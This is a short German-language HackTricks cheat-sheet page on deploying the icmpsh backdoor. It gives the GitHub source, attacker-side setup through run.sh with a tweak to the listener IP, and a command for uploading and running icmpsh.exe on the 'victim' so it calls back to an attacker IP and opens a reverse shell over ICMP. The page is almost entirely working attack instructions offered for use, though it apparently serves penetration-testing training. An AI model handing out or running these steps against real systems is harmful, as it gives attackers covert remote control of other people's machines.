{{#include ../banners/hacktricks-training.md}}

Laden Sie die Hintertür von: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Client-Seite

Führen Sie das Skript aus: **run.sh**

**Wenn Sie einen Fehler erhalten, versuchen Sie, die Zeilen zu ändern:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Für:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Opferseite**

Laden Sie **icmpsh.exe** auf das Opfer hoch und führen Sie es aus:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
